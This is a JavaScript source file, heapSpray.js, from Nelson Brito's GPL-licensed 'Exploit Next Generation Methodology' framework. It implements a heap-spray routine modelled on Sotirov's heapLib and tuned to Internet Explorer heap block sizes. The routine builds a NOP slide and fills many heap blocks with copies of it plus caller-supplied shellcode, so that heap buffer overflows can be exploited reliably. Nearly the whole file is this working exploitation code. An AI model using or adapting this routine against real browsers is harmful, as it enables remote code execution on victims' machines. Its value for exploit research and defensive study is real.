/* 
 * $Id: heapSpray.js,v 1.6 2011-03-21 17:40:18-03 nbrito Exp $
 */

/***************************************************************************
 *        ___________ _______    ________                                  *
 *        \_   _____/ \      \  /  _____/     .__         .__              *
 *         |    __)_  /   |   \/   \  ___   __|  |___   __|  |             *
 *         |        \/    |    \    \_\  \ /__    __/  /__    __/          *
 *        /_______  /\____|__  /\______  /    |__|        |__|             *
 *                \/         \/        \/                                  *
 *                                                                         *
 *                 Exploit Next Generation Methodology                     *
 *                            Release 6.00                                 *
 *                                                                         *
 *                 Copyright (c) 2004-2011 Nelson Brito                    *
 *                          All Rights Reserved                            *
 *                                                                         *
 ***************************************************************************
 * Author: Nelson Brito <nbrito@sekure.org>                                *
 *                                                                         *
 * Copyright (c) 2004-2011 Nelson Brito. All rights reserved worldwide.    *
 ***************************************************************************
 *                                                                         *
 * ENG example is free software;  you  may  redistribute and/or  modify it *
 * under the terms of the 'GNU General Public License' as published by the *
 * Free  Software  Foundation;  Version  2  with  the  clarifications  and *
 * exceptions described below.  This guarantees your right to use, modify, *
 * and redistribute this software under certain conditions. If you wish to *
 * embed ENG technology into  proprietary software,  please,  contact  the *
 * author for an alternative license (contact nbrito@sekure.org).          *
 *                                                                         *
 * This  program  is distributed in the hope that it will  be useful,  but *
 * WITHOUT  ANY  WARRANTY;    without   even   the   implied  warranty  of *
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.                    *
 * Please, refer to GNU General Public License v2.0 for further details at *
 * http://www.gnu.org/licenses/gpl-2.0.html,  or  in the  LICENSE document *
 * included with ENG.                                                      *
 ***************************************************************************/


/* Function Name: Heap Spray creation.

   Description:   This function creates a Heap Spray to exploit Haap BO.
                  Based on Alexander Sotirov's 'heapLib'.

   Targets:       N/A */
function heapSpray(){ }

heapSpray.Spray = function (heapCode, heapSize, heapOffset){

	this.Large = 0, this.Slack, this.Memory, this.Header, this.Fill, this.Block;

	/*
	 * Microsoft Internet Explorer has:
	 * (1) HEAP blocks header = 36 DWORDs.
	 * (2) HEAP blocks length = 0x40000 DWORDs.
	 */
	this.Header = 0x24;    /* '0x38' -> 56 DWORDs works better. */
	this.Size   = 0x40000;
	this.Slack  = this.Header + heapCode.length;

	/* 
	 * Creating a NOOP Slide that will fit exactly between the header and
	 * the assembly component - the code needs those HEAP blocks.
	 */
	do{
		heapOffset += heapOffset;
	} while (heapOffset.length < this.Slack);

	this.Fill   = heapOffset.substring(0, this.Slack);	
	this.Block  = heapOffset.substring(0, (heapOffset.length - this.Slack));

	do {
		this.Block += (this.Block + this.Fill);
	} while ((this.Block.length + this.Slack) < this.Size);

	/*
	 * Filling MB of HEAP with copies of the NOOP Slide  and the assembly
	 * components. Basicaly the code creates  HEAP blocks to spray enough
	 * memory to be sure enough it had got at NOOP Slide.
	 */
	this.Memory = new Array();

	do {
		this.Memory[this.Large] += this.Block + heapCode;
		this.Large++;
	} while (this.Large < heapSize);
}
